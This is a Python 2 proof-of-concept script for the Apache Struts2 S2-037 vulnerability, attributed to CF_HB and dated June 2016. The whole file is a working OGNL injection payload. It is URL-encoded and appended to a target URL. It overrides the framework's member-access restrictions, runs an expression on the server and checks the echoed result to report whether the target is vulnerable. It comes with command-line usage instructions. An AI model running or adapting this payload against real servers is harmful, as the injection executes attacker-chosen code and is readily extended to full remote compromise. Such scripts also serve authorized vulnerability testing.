#!/usr/bin/env python
# -*- coding:utf-8 -*-
# S2-037 POC
# Author: CF_HB
# 来源：http://zone.wooyun.org/content/27865
# 时间：2016年6月15日

import requests
import argparse

banner = u'''\
# S2-037 POC
# Author:CF_HB
# 时间：2016年6月15日
#使用说明：
# 1、检测
    python S2-037_PoC.py -u http://xxx.xxx.xxx.xxx/xx/
'''
def verity(url):
    s2037_poc = "/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F((%23writ%3D(%23attr%5B%23parameters.com%5B0%5D%5D).getWriter())%2C%23writ.println(3345*2356))%3Aindex.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
    try:
        print banner
        poc_url = url+s2037_poc
        print "[checking] " + url
        s = requests.session()
        res = s.post(poc_url, timeout=4)
        if res.status_code == 200 and "7880820" == res.content:
            print "{url} is vulnerable S2-037.".format(url=url)
        else:
            print "{url} is no vulnerable..".format(url=url)
    except Exception, e:
        print "Failed to connection target, try again.."
parser = argparse.ArgumentParser()
parser.add_argument('-u', help='the target url.')
args = parser.parse_args()
args_dict = args.__dict__

try:
    shellpath = None
    if not (args_dict['u'] == None):
        url = args_dict['u']
    verity(url)
except Exception,e:
    print parser.print_usage()
    exit(-1)
